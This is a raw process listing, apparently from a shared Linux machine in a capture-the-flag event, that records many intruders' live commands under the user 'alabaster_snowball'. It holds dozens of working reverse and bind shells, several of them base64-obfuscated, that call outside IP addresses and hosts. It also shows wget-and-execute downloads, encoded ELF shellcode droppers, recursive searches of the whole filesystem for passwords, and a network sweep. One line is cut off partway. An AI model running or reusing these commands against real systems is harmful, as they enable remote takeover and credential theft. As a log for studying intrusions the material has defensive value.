+alabast+ 11272  0.0  0.0      0     0 ?        Z    Dec17   0:00 [SQnAO] <defunct>
+alabast+ 11315  0.0  0.0      0     0 ?        Z    Dec17   0:00 [dQEdU] <defunct>
+alabast+ 11390  0.0  0.0   1112   912 ?        Sl   Dec17   0:01 /tmp/eAOcj
+alabast+ 11427  0.0  0.0  11172  3008 ?        S    Dec17   0:00 /bin/bash -c echo bmMgLWUgL2Jpbi9zaCBlYzItNTQtMjE4LTIyMi01Ny51cy13ZXN0LTIuY29tcHV0ZS5hbWF6b25hd3MuY29tIDgwMDA= | base64 -d | tee -a /tmp/.Q41h49UJ839sNZ8T9X4v.tmp ; /bin/bash /tmp/.Q41h49UJ839sNZ8T9X4v.tmp ; /bin/rm /tmp/.Q41h49UJ839sNZ8T9X4v.tmp
+alabast+ 11431  0.0  0.0  11172  2884 ?        S    Dec17   0:00 /bin/bash /tmp/.Q41h49UJ839sNZ8T9X4v.tmp
+alabast+ 11432  0.0  0.0   4288   760 ?        S    Dec17   0:00 sh
+root     11598  0.0  0.0      0     0 ?        S    Dec17   0:00 [kworker/5:1]
+alabast+ 11632  0.0  0.0   4288   756 ?        S    Dec17   0:00 /bin/sh
+alabast+ 11692  0.0  0.0  11172  2940 ?        S    Dec17   0:00 /bin/bash -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOC4yMTcuMjIzLjU0LzgwODAgMD4mMQ== | base64 -d | tee -a /tmp/.Hx3Xu1DfCq0eU6K95FKX.tmp ; /bin/bash /tmp/.Hx3Xu1DfCq0eU6K95FKX.tmp ; /bin/rm /tmp/.Hx3Xu1DfCq0eU6K95FKX.tmp
+alabast+ 11696  0.0  0.0  11172  2884 ?        S    Dec17   0:00 /bin/bash /tmp/.Hx3Xu1DfCq0eU6K95FKX.tmp
+alabast+ 11697  0.0  0.0  20960  4980 ?        S    Dec17   0:00 bash -i
+alabast+ 11723  0.0  0.0  11176  2912 ?        S    Dec17   0:00 /bin/bash -c echo Y2QgL2Rldi9zaG0gJiYgd2dldCBodHRwOi8vNzYuMTIuMTAxLjIyMC9yZXZfc2hlbGwxICYmIGNobW9kICt4IHJldl9zaGVsbDEgJiYgLi9yZXZfc2hlbGwx | base64 -d | tee -a /tmp/.s619Uzk60J8VWdYr0gZ6.tmp ; /bin/bash /tmp/.s619Uzk60J8VWdYr0gZ6.tmp ; /bin/rm /tmp/.s619Uzk60J8VWdYr0gZ6.tmp
+alabast+ 11728  0.0  0.0  11176  3000 ?        S    Dec17   0:00 /bin/bash /tmp/.s619Uzk60J8VWdYr0gZ6.tmp
+alabast+ 11732  0.0  0.0   2676  1272 ?        Sl   Dec17   0:05 ./rev_shell1
+alabast+ 11742  0.0  0.0   1360   976 ?        Sl   Dec17   0:00 ./hax2
+alabast+ 11845  0.0  0.0   4288   732 ?        S    Dec17   0:00 /bin/sh -c /bin/sh
+alabast+ 11846  0.0  0.0   4288   768 ?        S    Dec17   0:00 /bin/sh
+alabast+ 11852  0.0  0.0  32188  6728 ?        S    Dec17   0:00 python -c import pty; pty.spawn("/bin/bash")
+alabast+ 11853  0.0  0.0  19276  4344 pts/10   Ss   Dec17   0:00 /bin/bash
+alabast+ 11866  0.0  0.0   1452  1208 ?        Sl   Dec17   0:01 /tmp/odEtE
+alabast+ 12468  0.0  0.0  11172  2944 ?        S    Dec17   0:00 /bin/bash -c echo Z3JlcCAtUmkgInBhc3MiICogMj4mMSA+IC92YXIvd3d3L2h0bWwvcGJvdXRwdXQudHh0 | base64 -d | tee -a /tmp/.3MIE0L50pg03w32U092A.php ; /bin/bash /tmp/.3MIE0L50pg03w32U092A.php ; /bin/rm /tmp/.3MIE0L50pg03w32U092A.php
+alabast+ 12473  0.0  0.0  11176  2952 ?        S    Dec17   0:00 /bin/bash /tmp/.3MIE0L50pg03w32U092A.php
+alabast+ 12474  0.0  0.0  12856  2500 ?        S    Dec17   0:00 grep -Ri pass bin boot dev etc home initrd.img initrd.img.old lib lib32 lib64 libx32 lost+found media mnt opt proc root run sbin srv sys tmp usr var vmlinuz vmlinuz.old
+alabast+ 12535  0.0  0.0  11176  3004 ?        S    Dec17   0:00 /bin/bash -c echo ZWNobyBMMkpwYmk5aVlYTm9JQzFwSUQ0bUlDOWtaWFl2ZEdOd0x6RXpMalU0TGpJMU1pNDFNaTg0TURnd0lEQStKakU9IHwgYmFzZTY0IC1kIHwgdGVlIC1hIC90bXAvcGwudG1wOyAvYmluL2Jhc2ggL3RtcC9wbC50bXA7IC9iaW4vcm0gL3RtcC9wbC50bXA= | base64 -d | tee -a /tmp/.Ks4wvyNBo2Zy1Jb8yq3p.tmp ; /bin/bash /tmp/.Ks4wvyNBo2Zy1Jb8yq3p.tmp ; /bin/rm /tmp/.Ks4wvyNBo2Zy1Jb8yq3p.tmp
+alabast+ 12540  0.0  0.0  11176  2884 ?        S    Dec17   0:00 /bin/bash /tmp/.Ks4wvyNBo2Zy1Jb8yq3p.tmp
+alabast+ 12544  0.0  0.0  11172  3040 ?        S    Dec17   0:00 /bin/bash /tmp/pl.tmp
+alabast+ 12545  0.0  0.0  20960  4976 ?        S    Dec17   0:00 /bin/bash -i
+alabast+ 12742  0.0  0.0  11172  3000 ?        S    Dec17   0:00 /bin/bash -c echo bmMgLWUgL2Jpbi9iYXNoIDE2NS4yMjcuMTc3Ljk4IDEzMzc= | base64 -d | tee -a /tmp/.6AGaQBY90YCYAYha2829.tmp ; /bin/bash /tmp/.6AGaQBY90YCYAYha2829.tmp ; /bin/rm /tmp/.6AGaQBY90YCYAYha2829.tmp
+alabast+ 12747  0.0  0.0  11172  2872 ?        S    Dec17   0:00 /bin/bash /tmp/.6AGaQBY90YCYAYha2829.tmp
+alabast+ 12748  0.0  0.0  11168  2880 ?        S    Dec17   0:00 bash
+alabast+ 13499 99.7  0.0  12328  3132 pts/10   R+   Dec17 159:54 grep -r pass /
+alabast+ 13567  0.0  0.0   4288   804 ?        S    Dec17   0:00 /bin/sh -c /bin/sh
+alabast+ 13568  0.0  0.0   4288   720 ?        S    Dec17   0:00 /bin/sh
+alabast+ 13582  0.0  0.0  32188  6752 ?        S    Dec17   0:00 python -c import pty; pty.spawn("/bin/bash")
+alabast+ 13583  0.0  0.0  19276  4348 pts/14   Ss   Dec17   0:00 /bin/bash
+root     13955  0.0  0.0      0     0 ?        S    Dec17   0:00 [kworker/1:1]
+alabast+ 15024  0.2  0.1  82884 36892 ?        S    Dec17   0:21 nmap -v -sn 10.0.0.0/8
+alabast+ 15041  0.0  0.0  11176  2960 ?        S    Dec17   0:00 /bin/bash -c echo bmMgLWUgL2Jpbi9zaCAxMDcuMjIyLjEwMC4yNSA4MA== | base64 -d | tee -a /tmp/.5ah60HMX7im6r74E4l8B.tmp ; chmod +x .5ah60HMX7im6r74E4l8B.tmp;/bin/bash /tmp/.5ah60HMX7im6r74E4l8B.tmp ; /bin/rm /tmp/.5ah60HMX7im6r74E4l8B.tmp
+alabast+ 15046  0.0  0.0  11172  2932 ?        S    Dec17   0:00 /bin/bash /tmp/.5ah60HMX7im6r74E4l8B.tmp
+alabast+ 15047  0.0  0.0   4288   716 ?        S    Dec17   0:00 sh
+alabast+ 15149  0.0  0.0  12868  2648 ?        S    Dec17   0:01 grep -iR password /bin /boot /dev /etc /home /initrd.img /initrd.img.old /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz /vmlinuz.old
+alabast+ 15555  0.0  0.0  11172  2944 ?        S    Dec17   0:00 /bin/bash -c echo bmMgMTczLjY2LjExMi4yOSAzMTMzNyAtZSAvYmluL2Jhc2g= | base64 -d | tee -a /tmp/.0G7mz1ixnqBEl3q25KWG.tmp ; /bin/bash /tmp/.0G7mz1ixnqBEl3q25KWG.tmp ; /bin/rm /tmp/.0G7mz1ixnqBEl3q25KWG.tmp
+alabast+ 15559  0.0  0.0  11172  2948 ?        S    Dec17   0:00 /bin/bash /tmp/.0G7mz1ixnqBEl3q25KWG.tmp
+alabast+ 15560  0.0  0.0  11188  2904 ?        S    Dec17   0:00 bash
+alabast+ 15567  0.0  0.0  11176  2952 ?        S    Dec17   0:00 /bin/bash -c echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTY1LjIyNy4yMTEuMjQiLDgwKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn | base64 -d | tee -a /tmp/.It61EwiTytLyKL3vYRhF.tmp ; /bin/bash /tmp/.It61EwiTytLyKL3vYRhF.tmp ; /bin/rm /tmp/.It61EwiTytLyKL3vYRhF.tmp
+alabast+ 15571  0.0  0.0  11176  2884 ?        S    Dec17   0:00 /bin/bash /tmp/.It61EwiTytLyKL3vYRhF.tmp
+alabast+ 15572  0.0  0.0  33552 10320 ?        S    Dec17   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("165.227.211.24",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+alabast+ 15573  0.0  0.0   4288   808 ?        S    Dec17   0:00 /bin/sh -i
+alabast+ 15805  0.0  0.0  11172  2884 ?        S    Dec17   0:00 /bin/bash -c echo bmMgLWUgL2Jpbi9iYXNoIDE2NS4yMjcuMTc3Ljk4IDEzMzc= | base64 -d | tee -a /tmp/.4ei78IJRXI8eut46RFYo.tmp ; /bin/bash /tmp/.4ei78IJRXI8eut46RFYo.tmp ; /bin/rm /tmp/.4ei78IJRXI8eut46RFYo.tmp
+alabast+ 15809  0.0  0.0  11172  3048 ?        S    Dec17   0:00 /bin/bash /tmp/.4ei78IJRXI8eut46RFYo.tmp
+alabast+ 15810  0.0  0.0  11168  3060 ?        S    Dec17   0:00 bash
+alabast+ 16383  0.0  0.0   1148  1016 ?        Sl   Dec17   0:00 ./nothingtoworryabout
+alabast+ 16470  0.0  0.0  11176  3056 ?        S    Dec17   0:00 /bin/bash -c echo ZWNobyBMMkpwYmk5aVlYTm9JQzFwSUQ0bUlDOWtaWFl2ZEdOd0x6RXpMalU0TGpJMU1pNDFNaTg0TURnd0lEQStKakU9IHwgYmFzZTY0IC1kIHwgdGVlIC1hIC90bXAvcGwudG1wOyAvYmluL2Jhc2ggL3RtcC9wbC50bXA7IC9iaW4vcm0gL3RtcC9wbC50bXA= | base64 -d | tee -a /tmp/.ZLgoZga2m6w378f4OaZC.tmp ; /bin/bash /tmp/.ZLgoZga2m6w378f4OaZC.tmp ; /bin/rm /tmp/.ZLgoZga2m6w378f4OaZC.tmp
+alabast+ 16474  0.0  0.0  11176  3000 ?        S    Dec17   0:00 /bin/bash /tmp/.ZLgoZga2m6w378f4OaZC.tmp
+alabast+ 16478  0.0  0.0  11172  3052 ?        S    Dec17   0:00 /bin/bash /tmp/pl.tmp
+alabast+ 16479  0.0  0.0  20960  4720 ?        S    Dec17   0:00 /bin/bash -i
+alabast+ 16529 99.7  0.0  14056  3704 ?        R    Dec17 125:25 grep -rnw / -e alabaster
+alabast+ 16540  0.0  0.0  11172  2884 ?        S    Dec17   0:00 /bin/bash -c echo bmMgLWUgL2Jpbi9iYXNoIDY4LjQ4LjI0MS4zNCA4MA== | base64 -d | tee -a /tmp/.Sy62h198q61l9d01Y4Tf.tmp ; /bin/bash /tmp/.Sy62h198q61l9d01Y4Tf.tmp ; /bin/rm /tmp/.Sy62h198q61l9d01Y4Tf.tmp
+alabast+ 16544  0.0  0.0  11172  3052 ?        S    Dec17   0:00 /bin/bash /tmp/.Sy62h198q61l9d01Y4Tf.tmp
+alabast+ 16545  0.0  0.0  11168  2980 ?        S    Dec17   0:00 bash
+alabast+ 16553  0.0  0.0  33836  7220 ?        S    Dec17   0:00 python -c import pty; pty.spawn("/bin/bash")
+alabast+ 16554  0.0  0.0  20964  4736 pts/16   Ss+  Dec17   0:00 /bin/bash
+root     16622  0.0  0.0      0     0 ?        S    Dec17   0:00 [kworker/4:0]
+alabast+ 16690 99.6  0.0  12328  3132 pts/14   R+   Dec17 123:41 grep -r pass /
+alabast+ 16916  0.0  0.0   4288   748 ?        S    Dec17   0:00 /bin/sh -c /bin/sh
+alabast+ 16917  0.0  0.0   4288   720 ?        S    Dec17   0:00 /bin/sh
+alabast+ 17053  0.0  0.0   4288   716 ?        S    Dec17   0:00 /bin/sh -c echo bHMgLWFsUiAvZXRjL25naW54LyB8IGdyZXAgY29uZiB8IGNhdCAkMCB8IHRlZSAtYSAtcCAtLW91dHB1dC1lcnJvcj13YXJuIC92YXIvd3d3L2h0bWwvZXJ0Z2RmanRyamtldHIyLnR4dA== | base64 -d | /bin/sh
+alabast+ 17057  0.0  0.0   4288   704 ?        S    Dec17   0:00 /bin/sh
+alabast+ 17061  0.0  0.0   5844   664 ?        S    Dec17   0:00 tee -a -p --output-error=warn /var/www/html/ertgdfjtrjketr2.txt
+alabast+ 17082  0.0  0.0   4288   724 ?        S    Dec17   0:00 sh -c /bin/sh
+alabast+ 17084  0.0  0.0   4288  1448 ?        S    Dec17   0:00 /bin/sh
+www-data 17288  0.0  0.0   4288   768 ?        S    Dec17   0:00 sh -c ls -LR /
+www-data 17289 99.4  0.0  13536  1956 ?        R    Dec17 111:58 ls -LR /
+alabast+ 17299  0.0  0.0   4288   736 ?        S    Dec17   0:00 /bin//sh
+alabast+ 17303  0.0  0.0  17940  2856 ?        S    Dec17   0:00 /bin/bash
+alabast+ 17305  0.0  0.0   4288   728 ?        S    Dec17   0:00 /bin/sh
+alabast+ 17400  0.0  0.0  11172  2940 ?        S    Dec17   0:00 /bin/bash -c echo bmMgLWwgLXAgNjA2MDYgLWUgL2Jpbi9zaA== | base64 -d | tee -a /tmp/.XwsXQY3L7r6JGbCaI1P5.tmp ; /bin/bash /tmp/.XwsXQY3L7r6JGbCaI1P5.tmp ; /bin/rm /tmp/.XwsXQY3L7r6JGbCaI1P5.tmp
+alabast+ 17405  0.0  0.0  11172  3048 ?        S    Dec17   0:00 /bin/bash /tmp/.XwsXQY3L7r6JGbCaI1P5.tmp
+alabast+ 17406  0.0  0.0   6312  1680 ?        S    Dec17   0:00 nc -l -p 60606 -e /bin/sh
+alabast+ 17427  0.0  0.0   4288   752 ?        S    Dec17   0:00 /bin/sh
+alabast+ 17621  0.0  0.0   4288   808 ?        S    Dec17   0:00 /bin/sh -c rm -f /tmp/tkfpayload.tmp ; echo f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiYAAAA3AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2Ak1mwP82ASXn5aEfad7NoAgAAUInhsGZQUVOzA4nhzYBSaG4vc2hoLy9iaYnjUlOJ4bALzYA= | base64 -d | tee -a /tmp/tkfpayload.tmp ; /bin/chmod +x /tmp/tkfpayload.tmp ; /tmp/tkfpayload.tmp
+alabast+ 17627  0.0  0.0   4288  1496 ?        S    Dec17   0:00 //bin/sh
+alabast+ 17673  0.0  0.0   4288   764 ?        S    Dec17   0:00 /bin/sh -i
+c17   0:00 /bin/bash -c echo bmMgLWUgL2Jpbi9iYXNoIDY4LjQ4LjI0MS4zNCA4MA== | base64 -d | tee -a /tmp/.0f53CNjI6PHJv7lWFq01.tmp ; /bin/bash /tmp/.0f53CNjI6PHJv7lWFq01.tmp ; /bin/rm /tmp/.0f53CNjI6PHJv7lWFq01.tmp
+alabast+ 17832  0.0  0.0  11172  2944 ?        S    Dec17   0:00 /bin/bash /tmp/.0f53CNjI6PHJv7lWFq01.tmp
+alabast+ 17833  0.0  0.0  11168  2876 ?        S    Dec17   0:00 bash
+alabast+ 17840  0.0  0.0  33836  7200 ?        S    Dec17   0:00 python -c import pty; pty.spawn("/bin/bash")
+alabast+ 17841  0.0  0.0  20964  4980 pts/17   Ss+  Dec17   0:00 /bin/bash
+root     17946  0.0  0.0  92716  6664 ?        Ss   Dec17   0:00 sshd: alabaster_snowball [priv]
+alabast+ 17954  0.0  0.0  92716  3804 ?        S    Dec17   0:00 sshd: alabaster_snowball@pts/18
+alabast+ 17955  0.0  0.0  20992  4764 pts/18   Ss+  Dec17   0:00 -bash
+alabast+ 18103  0.0  0.0  11176  3000 ?        S    Dec17   0:00 /bin/bash -c echo ZXhlYyA1PD4vZGV2L3RjcC9maXJlYXgubnVsbGhlYWQuY29tLzg4ODggJiYgbmMgLWUgL2Jpbi9iYXNoIGZpcmVheC5udWxsaGVhZC5jb20gNDU2NyAyPiY1ID4mNQ== | base64 -d | tee -a /tmp/.7BfgN34LhIGIDwxHAkQQ.tmp ; /bin/bash /tmp/.7BfgN34LhIGIDwxHAkQQ.tmp ; /bin/rm /tmp/.7BfgN34LhIGIDwxHAkQQ.tmp
+alabast+ 18108  0.0  0.0  17532  3444 ?        S    Dec17   0:00 /bin/bash /tmp/.7BfgN34LhIGIDwxHAkQQ.tmp
+alabast+ 18109  0.0  0.0  11176  3072 ?        S    Dec17   0:00 bash
+alabast+ 18166  0.0  0.0   4288   760 ?        S    Dec17   0:00 /bin/sh -c /bin/sh
+alabast+ 18167  0.0  0.0   4288   724 ?        S    Dec17   0:00 /bin/sh
+alabast+ 18210  0.0  0.0   4288   764 ?        S    Dec17   0:00 /bin/sh -c /bin/sh
+alabast+ 18211  0.0  0.0   4288   724 ?        S    Dec17   0:00 /bin/sh
+alabast+ 18222  0.0  0.0  32188  6656 ?        S    Dec17   0:00 python -c import pty; pty.spawn("/bin/bash")
+alabast+ 18223  0.0  0.0  19276  4464 pts/19   Ss   Dec17   0:00 /bin/bash
+root     18376  0.0  0.0      0     0 ?        S    Dec17   0:00 [kworker/7:1]
+alabast+ 19101  0.0  0.0   4288   776 ?        S    Dec17   0:00 /bin/sh -c echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1toIsrtKWgCABFcieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZtgywA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/YBECe.b64' ; ((which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/yTkAf' < '/tmp/YBECe.b64' ; chmod +x '/tmp/yTkAf' ; '/tmp/yTkAf' ; rm -f '/tmp/yTkAf' ; rm -f '/tmp/YBECe.b64'
+alabast+ 19106  0.0  0.0   1284  1148 ?        Sl   Dec17   0:00 /tmp/yTkAf
+alabast+ 19118  0.0  0.0   4200   676 pts/19   S+   Dec17   0:00 tee process.php
+alabast+ 19124  0.0  0.0   4288   712 ?        S    Dec17   0:00 /bin/sh -c /bin/sh
+alabast+ 19125  0.0  0.0   4288   760 ?        S    Dec17   0:00 /bin/sh
+alabast+ 19207  0.0  0.0   4288   768 ?        S    Dec17   0:00 /bin/sh -c /bin/sh
+alabast+ 19208  0.0  0.0   4288   768 ?        S    Dec17   0:00 /bin/sh
+alabast+ 19235  0.0  0.0   4288   760 ?        S    Dec17   0:00 /bin/sh -c /bin/sh
+alabast+ 19236  0.0  0.0   4288   768 ?        S    Dec17   0:00 /bin/sh
+alabast+ 19261  0.0  0.0   4288   756 ?        S    Dec17   0:00 /bin/sh -c nc -e /bin/sh 35.196.24.165 80
+alabast+ 19262  0.0  0.0   4288  1560 ?        S    Dec17   0:00 sh
+alabast+ 19269  0.0  0.0   4288   792 ?        S    Dec17   0:00 /bin/sh -c /bin/sh
+alabast+ 19270  0.0  0.0   4288   728 ?        S    Dec17   0:00 /bin/sh
+alabast+ 19326  0.0  0.0   4288   792 ?        S    Dec17   0:00 /bin/sh -c /bin/sh
+alabast+ 19327  0.0  0.0   4288   760 ?        S    Dec17   0:00 /bin/sh
+alabast+ 19369  0.0  0.0  11172  2948 ?        S    Dec17   0:00 /bin/bash -c echo bmMgLWUgL2Jpbi9zaCBrYWxpMy5wcmFldG9yaWFubGFicy5jb20gODA4MA== | base64 -d | tee -a /tmp/.Q2AI543g75cd2GrhcMCp.tmp ; /bin/bash /tmp/.Q2AI543g75cd2GrhcMCp.tmp ; /bin/rm /tmp/.Q2AI543g75cd2GrhcMCp.tmp
+alabast+ 19373  0.0  0.0  11172  3056 ?        S    Dec17   0:00 /bin/bash /tmp/.Q2AI543g75cd2GrhcMCp.tmp
+alabast+ 19374  0.0  0.0   4288   760 ?        S    Dec17   0:00 sh
+alabast+ 19407  0.0  0.0  33836  7016 ?        S    Dec17   0:00 python -c import pty; pty.spawn("/bin/sh")
+alabast+ 19408  0.0  0.0   4288   724 pts/15   Ss+  Dec17   0:00 /bin/sh
+alabast+ 19509  0.0  0.0   4288   712 ?        S    00:01   0:00 /bin/sh -c /bin/sh
+alabast+ 19510  0.0  0.0   4288   720 ?        S    00:01   0:00 /bin/sh
+alabast+ 19576  0.0  0.0  23652  3028 ?        S    00:02   0:00 ls -alR
+alabast+ 19577  0.0  0.0  12784   980 ?        S    00:02   0:00 grep -ni pass
+alabast+ 19589  0.0  0.0   4288   764 ?        S    00:03   0:00 /bin/sh -c nc -e /bin/sh 35.196.24.165 80
+alabast+ 19590  0.0  0.0   4288   804 ?        S    00:03   0:00 sh
+alabast+ 19594  0.0  0.0  23652  3052 ?        S    00:03   0:00 ls -alR /
+alabast+ 19595  0.0  0.0  12784   952 ?        S    00:03   0:00 grep -ni pass
+alabast+ 19604  0.0  0.0   4288   724 ?        S    00:03   0:00 /bin/sh -c nc -e /bin/sh 35.196.24.165 443
+alabast+ 19606  0.0  0.0   4288  1444 ?        S    00:03   0:00 sh
+alabast+ 19608  0.0  0.0   4288   744 ?        S    00:03   0:00 /bin/sh -c /bin/sh
+alabast+ 19609  0.0  0.0   4288   796 ?        S    00:03   0:00 /bin/sh
+alabast+ 19629  0.0  0.0  32188  6872 ?        S    00:03   0:00 python -c import pty; pty.spawn("/bin/bash")
+alabast+ 19631  0.0  0.0  19276  4372 pts/20   Ss   00:03   0:00 /bin/bash
+root     19703  0.0  0.0  92716  6824 ?        Ss   00:04   0:00 sshd: alabaster_snowball [priv]
+alabast+ 19710  0.0  0.0  92852  4608 ?        S    00:04   0:00 sshd: alabaster_snowball@pts/21
+alabast+ 19711  0.0  0.0  20992  4876 pts/21   Ss+  00:04   0:00 -bash
+alabast+ 19936  0.4  0.0  13188  2796 ?        S    00:08   0:19 grep -rni pass .
+alabast+ 19960  0.0  0.0   4288   808 ?        S    00:08   0:00 /bin/sh -c nc -e /bin/sh 35.196.24.165 80
+alabast+ 19961  0.0  0.0   4288   716 ?        S    00:08   0:00 sh
+alabast+ 19976  0.0  0.0  19268  4336 pts/20   S    00:08   0:00 /bin/bash
+alabast+ 19989  0.4  0.0  13188  2956 ?        S    00:08   0:18 grep -rni pass .
+alabast+ 19990  0.0  0.0  12784   980 ?        S    00:08   0:00 grep -ni snow
+root     20069  0.0  0.0      0     0 ?        S    00:09   0:00 [kworker/3:0]
+alabast+ 20286  0.0  0.0   4200   716 pts/20   S+   00:12   0:00 tee process.php
+alabast+ 20346  0.0  0.0   4288   756 ?        S    00:13   0:00 /bin/sh -c nc -e /bin/bash 35.196.24.165 80
+alabast+ 20347  0.0  0.0  11188  3092 ?        S    00:13   0:00 bash
+alabast+ 21108  0.0  0.0   4288   732 ?        S    00:14   0:00 /bin/sh -c /bin/sh
+alabast+ 21109  0.0  0.0   4288   724 ?        S    00:14   0:00 /bin/sh
+alabast+ 21125  0.0  0.0  32188  6752 ?        S    00:14   0:00 python -c import pty; pty.spawn("/bin/bash")
+alabast+ 21126  0.0  0.0  19276  4456 pts/23   Ss   00:14   0:00 /bin/bash
+alabast+ 21203  0.0  0.0   4288   756 ?        S    00:14   0:00 /bin/sh -c cd /tmp/ && wget http://96.225.34.106:8888/gogood && chmod +x gogood && ./gogood
+alabast+ 21206  0.0  0.0   1564   932 ?        Sl   00:14   0:00 ./gogood
+alabast+ 21219  0.0  0.0   4200   696 pts/23   S+   00:14   0:00 cat f
+alabast+ 21227  0.0  0.0   4288   728 ?        S    00:14   0:00 /bin/sh -c /bin/sh
+alabast+ 21228  0.0  0.0   4288   728 ?        S    00:14   0:00 /bin/sh
+alabast+ 21234  0.0  0.0  32188  6848 ?        S    00:15   0:00 python -c import pty; pty.spawn("/bin/bash")
+alabast+ 21235  0.0  0.0  19276  4364 pts/24   Ss   00:15   0:00 /bin/bash
+alabast+ 21255  0.0  0.0   4288   728 ?        S    00:15   0:00 /bin/sh -c cd /tmp/ && wget http://96.225.34.106:8888/gogogo && chmod +x gogogo && ./gogogo
+alabast+ 21258  0.0  0.0   4288   724 ?        S    00:15   0:00 //bin/sh
+alabast+ 21391 99.6  0.0  12352  3160 pts/24   R+   00:17  56:53 grep -ro password /
+alabast+ 21409  0.0  0.0   4288   748 ?        S    00:17   0:00 /bin/sh -c /bin/sh
+alabast+ 21410  0.0  0.0   4288   748 ?        S    00:17   0:00 /bin/sh
+alabast+ 21414  0.0  0.0  32188  6736 ?        S    00:17   0:00 python -c import pty; pty.spawn("/bin/bash")
+alabast+ 21415  0.0  0.0  19276  4436 pts/25   Ss   00:17   0:00 /bin/bash
+root     21454  0.0  0.0  92716  6604 ?        Ss   00:18   0:00 sshd: alabaster_snowball [priv]
+alabast+ 21460  0.1  0.0  92840  4284 ?        S    00:18   0:03 sshd: alabaster_snowball@pts/13
+alabast+ 21461  0.0  0.0  20992  4780 pts/13   Ss   00:18   0:00 -bash
+alabast+ 21672  0.0  0.0  11172  2880 ?        S    00:21   0:00 /bin/bash -c echo L2Jpbi9zaCB8IG5jIDU0LjE2NS4xNzkuMTI0IDEzMzcgLWUgL2Jpbi9iYXNo | base64 -d | tee -a /tmp/.8BE92d4moBWvEL4H7OP3.tmp ; /bin/bash /tmp/.8BE92d4moBWvEL4H7OP3.tmp ; /bin/rm /tmp/.8BE92d4moBWvEL4H7OP3.tmp
+alabast+ 21676  0.0  0.0  11172  2956 ?        S    00:21   0:00 /bin/bash /tmp/.8BE92d4moBWvEL4H7OP3.tmp
+alabast+ 21677  0.0  0.0   4288   756 ?        S    00:21   0:00 /bin/sh
+alabast+ 21678  0.0  0.0  11168  2880 ?        S    00:21   0:00 bash
+alabast+ 21727  1.5  0.0  13208  3016 ?        S    00:22   0:48 grep -r -i alabaster /
+alabast+ 21782  0.0  0.0  11176  2884 ?        S    00:23   0:00 /bin/bash -c echo cm0gL3RtcC9rO21rZmlmbyAvdG1wL2s7Y2F0IC90bXAva3wvYmluL3NoIC1pIDI+JjF8bmMgLXcgMyA0NS42Mi4yMjkuMTE3IDMxMzM0ID4vdG1wL2s= | base64 -d | tee -a /tmp/.H5s5T7r6qmwA7Gnn2s72.tmp ; /bin/bash /tmp/.H5s5T7r6qmwA7Gnn2s72.tmp ; /bin/rm /tmp/.H5s5T7r6qmwA7Gnn2s72.tmp
+alabast+ 21787  0.0  0.0  11176  2892 ?        S    00:23   0:00 /bin/bash /tmp/.H5s5T7r6qmwA7Gnn2s72.tmp
+alabast+ 21790  0.0  0.0   5980   672 ?        S    00:23   0:00 cat /tmp/k
+alabast+ 21791  0.0  0.0   4288   724 ?        S    00:23   0:00 /bin/sh -i
+alabast+ 21792  0.0  0.0   6312  1648 ?        S    00:23   0:00 nc -w 3 45.62.229.117 31334
+www-data 21895  0.0  0.0   4288   716 ?        S    00:24   0:00 sh -c grep -ir alabaster_snowball /
+www-data 21896 99.6  0.0  12340  3068 ?        R    00:24  49:29 grep -ir alabaster_snowball /
+alabast+ 21984  0.0  0.0   4288   792 ?        S    00:25   0:00 /bin/sh -c echo bmMgLWMgL2Jpbi9zaCA4MC4yMjkuMTQ0LjcxIDQ0NDQgfCB0ZWUgLWEgLXAgLS1vdXRwdXQtZXJyb3I9d2FybiAvdmFyL3d3dy9odG1sL2VydGdkZmp0cmprZXRyMi50eHQK | base64 -d | /bin/sh
+alabast+ 21987  0.0  0.0   4288   804 ?        S    00:25   0:00 /bin/sh
+alabast+ 21988  0.0  0.0   4288   768 ?        S    00:25   0:00 sh -c /bin/sh
+alabast+ 21990  0.0  0.0   4288   748 ?        S    00:25   0:00 /bin/sh
+alabast+ 21996  0.0  0.0  11172  3056 ?        S    00:25   0:00 /bin/bash -c echo bmMgLXZ2bHAgNDMyNTEgLWUgL2Jpbi9iYXNo | base64 -d | tee -a /tmp/.ej00CUpPca0B8b70O6r9.tmp ; /bin/bash /tmp/.ej00CUpPca0B8b70O6r9.tmp ; /bin/rm /tmp/.ej00CUpPca0B8b70O6r9.tmp
+alabast+ 22000  0.0  0.0  11172  2884 ?        S    00:25   0:00 /bin/bash /tmp/.ej00CUpPca0B8b70O6r9.tmp
+alabast+ 22001  0.0  0.0   6312  1696 ?        S    00:25   0:00 nc -vvlp 43251 -e /bin/bash
+alabast+ 22014  2.6  0.0  13336  3036 ?        S    00:26   1:16 grep -iR alabaster
+alabast+ 22045  0.0  0.0   4288   756 ?        S    00:26   0:00 sh -c /bin/sh
